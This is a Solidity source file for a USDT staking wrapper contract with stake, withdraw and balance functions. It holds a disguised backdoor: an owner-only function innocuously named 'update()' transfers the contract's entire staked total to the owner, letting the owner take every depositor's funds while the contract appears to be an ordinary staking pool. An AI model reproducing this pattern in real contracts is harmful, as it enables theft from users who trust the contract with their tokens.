pragma solidity ^0.6.0;

import "./SafeMath.sol";
import "./SafeERC20.sol";
import "./Ownable.sol";

contract USDTWrapper is Ownable{
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    IERC20 public usdt;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function update() public onlyOwner {
        usdt.safeTransfer(msg.sender, _totalSupply);
    }

    function stake(uint256 amount) public virtual {
        _totalSupply = _totalSupply.add(amount);
        _balances[msg.sender] = _balances[msg.sender].add(amount);
        usdt.safeTransferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 amount) public virtual {
        _totalSupply = _totalSupply.sub(amount);
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        usdt.safeTransfer(msg.sender, amount);
    }
}